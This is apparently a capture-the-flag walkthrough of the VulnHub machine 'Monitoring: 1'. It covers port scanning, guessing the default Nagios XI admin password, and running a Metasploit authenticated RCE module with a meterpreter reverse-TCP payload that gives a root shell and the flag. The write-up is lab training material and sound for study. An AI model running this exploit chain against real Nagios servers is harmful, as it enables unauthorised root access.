# VulnHUb > Monitoring: 1

* Name: Monitoring: 1
* Date release: 14 Sep 2020
* Author: SunCSR Team
* Series: Monitoring
* Difficulty: Very Easy
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell and then obtain flag under `/root`

# Services enumeration

~~~
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Nagios XI
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/ssl    Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Nagios XI authentication

Connecting to port 443 and clicking on the "Access Nagios XI" button redirects us to the authentication form (https://monitoring.box/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1). Checking on the Internet reveals that the admin account for Nagios is `nagiosadmin`.

Trying common passwords eventually leads to a successful authentication with the password `admin`.

# Exploit

There is a Remote Code Execution (RCE) exploit against Nagios XI that we can use in Metasploit: `nagios_xi_authenticated_rce`.

~~~
kali@kali:/data/Monitoring_1/files$ msfconsole -q
msf5 > search nagios_xi

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration


Interact with a module by name or index, for example use 4 or use post/linux/gather/enum_nagios_xi

msf5 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_authenticated_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to NagiosXI
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)
~~~

Let's set the variables and start the exploit:

~~~
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set rhost monitoring.box
rhost => monitoring.box
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set password admin
password => admin
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set lhost 172.16.222.128
lhost => 172.16.222.128
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > exploit 

[*] Started reverse TCP handler on 172.16.222.128:4444 
[*] Found Nagios XI application with version 5.6.0.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] Sending stage (3012516 bytes) to 172.16.222.135
[*] Meterpreter session 1 opened (172.16.222.128:4444 -> 172.16.222.135:33172) at 2020-09-22 09:20:56 +0200
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > shell 
Process 17743 created.
Channel 1 created.

which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~

# Root flag

The exploit directly connects us as `root`. Let's read the root flag:

~~~
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# cd /root
cd /root
root@ubuntu:~# ls -la
ls -la
total 48
drwx------  7 root root 4096 Sep  8 11:34 .
drwxr-xr-x 23 root root 4096 Sep  8 11:05 ..
-rw-------  1 root root  407 Sep  8 11:34 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  6 root root 4096 Sep  8 11:00 .cpan
drwx------  2 root root 4096 Sep  8 11:00 .gnupg
drwxr-xr-x  2 root root 4096 Sep  8 10:56 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1024 Sep  8 11:26 .rnd
drwxr-xr-x  3 root root 4096 Sep  8 11:22 .subversion
-rw-r--r--  1 root root   47 Sep  8 11:33 proof.txt
drwxr-xr-x  2 root root 4096 Sep  8 11:05 scripts
root@ubuntu:~# cat proof.txt
cat proof.txt
SunCSR.Team.3.af6d45da1f1181347b9e2139f23c6a5b
~~~
